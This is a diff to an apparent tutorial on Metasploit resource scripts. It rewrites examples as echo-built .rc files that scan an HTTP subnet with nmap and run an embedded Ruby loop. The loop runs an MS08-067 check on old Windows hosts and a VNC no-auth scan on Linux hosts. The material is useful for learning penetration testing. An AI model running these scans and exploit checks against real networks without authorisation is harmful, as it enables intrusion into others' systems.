@@ -165,7 +165,7 @@
       touch http_brute.rc
 
          echo 'setg THREADS 15' > /root/http_brute.rc
-         echo 'setg RHOSTS 192.168.1.0/24' >> /root/http_brute.rc
+         echo 'setg RHOSTS 192.168.1.254' >> /root/http_brute.rc
          echo 'use auxiliary/scanner/http/http_version' >> /root/http_brute.rc
          echo 'run' >> /root/http_brute.rc
          echo 'use auxiliary/scanner/http/dir_scanner' >> /root/http_brute.rc
@@ -227,55 +227,61 @@
 ## USING RUBY IN RC (ERB scripting)
 <blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple msfconsole or meterpreter commands together with ruby syntax or metasploit APIs.</blockquote>
 
-- **ERB scripting (ruby)::**`[resource_script.rc]`<br />
+- **ERB scripting (ruby)::**`[http_title.rc]`<br />
 
-      workspace -a http_title
-      db_nmap -Pn -T4 -n -v -p 80 --open 192.168.33.0/24
-      use auxiliary/scanner/http/title
-         <ruby>
-           run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")
-         </ruby>
-      run
+      touch http_title.rc
 
-     `[run]` msfconsole -r /root/script.rc
+        echo 'workspace -a http_title' > http_title.rc
+        echo 'db_nmap -Pn -T4 -n -v -p 80 --open 192.168.1.0/24' >> http_title.rc
+        echo 'services' >> http_title.rc
+        echo 'use auxiliary/scanner/http/title' >> http_title.rc
+        echo '   <ruby>' >> http_title.rc
+        echo '     print_good("Running ruby code inside resource files")' >> http_title.rc
+        echo '     run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")' >> http_title.rc
+        echo '   </ruby>' >> http_title.rc
+        echo 'run' >> http_title.rc
+        echo 'workspace -d http_title' >> http_title.rc
+
+     `[run]` msfconsole -r /root/http_title.rc
 
 <br /><br />
 
-- **FFF**
-
-      setg 192.168.1.71 192.168.1.254
+- **FFF::**`[exploiter.rc]`<br />
 
 <br />
 
-      <ruby>
-      framework.db.hosts.each do |h|
-         h.services.each do |serv|
- 
-         if serv.port == 445 and h.os_flavor =~/XP|.NET Server|2003/i
-                next if (serv.port != 445)
-                print_good("#{h.address} seems to be Windows #{h.os_flavor}...")
-                self.run_single("use exploit/windows/smb/ms08_067_netapi")
-                print_good("Running ms08_067_netapi check against #{h.address}")
-                self.run_single("set RHOST #{h.address}")
-                self.run_single("check")
-   
-         elsif serv.port == 5900 and h.os_name =~/Linux/i
-                next if (serv.port != 5900)
-                print_good("#{h.address} seems to be Linux #{h.os_flavor}...")
-                self.run_single("use auxiliary/scanner/vnc/vnc_none_auth")
-                print_good("Running VNC no auth check against #{h.os_flavor}")
-                self.run_single("set RHOSTS #{h.address}")
-                self.run_single("run")
- 
-         else
-                print_error("#{h.address} does not have port 445/5900 open")
-                return nil 
-         end
-       end
-      end
-      </ruby>
+      touch exploiter.rc
 
-     `[run]` msfconsole -r /root/script.rc
+        echo 'setg 192.168.1.71 192.168.1.254' > exploiter.rc
+        echo '' >> exploiter.rc
+        echo '<ruby>' >> exploiter.rc
+        echo 'framework.db.hosts.each do |h|' >> exploiter.rc
+        echo '   h.services.each do |serv|' >> exploiter.rc
+        echo '' >> exploiter.rc
+        echo '   if serv.port == 445 and h.os_flavor =~/XP|.NET Server|2003/i' >> exploiter.rc
+        echo '          next if (serv.port != 445)' >> exploiter.rc
+        echo '          print_good("#{h.address} seems to be Windows #{h.os_flavor}.")' >> exploiter.rc
+        echo '          run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
+        echo '          print_good("Running ms08_067_netapi check against #{h.address}")' >> exploiter.rc
+        echo '          run_single("set RHOST #{h.address}")' >> exploiter.rc
+        echo '          run_single("check")' >> exploiter.rc
+        echo '' >> exploiter.rc
+        echo '   elsif serv.port == 5900 and h.os_name =~/Linux/i' >> exploiter.rc
+        echo '          next if (serv.port != 5900)' >> exploiter.rc
+        echo '          print_good("#{h.address} seems to be Linux #{h.os_flavor}.")' >> exploiter.rc
+        echo '          run_single("use auxiliary/scanner/vnc/vnc_none_auth")' >> exploiter.rc
+        echo '          print_good("Running VNC no auth check against #{h.os_flavor}")' >> exploiter.rc
+        echo '          run_single("set RHOSTS #{h.address}")' >> exploiter.rc
+        echo '          run_single("run")' >> exploiter.rc
+        echo '   else' >> exploiter.rc
+        echo '          print_error("#{h.address} does not have port 445/5900 open")' >> exploiter.rc
+        echo '          return nil' >> exploiter.rc
+        echo '   end' >> exploiter.rc
+        echo ' end' >> exploiter.rc
+        echo 'end' >> exploiter.rc
+        echo '</ruby>' >> exploiter.rc
+
+     `[run]` msfconsole -r /root/exploiter.rc
 
 <br /><br />
 
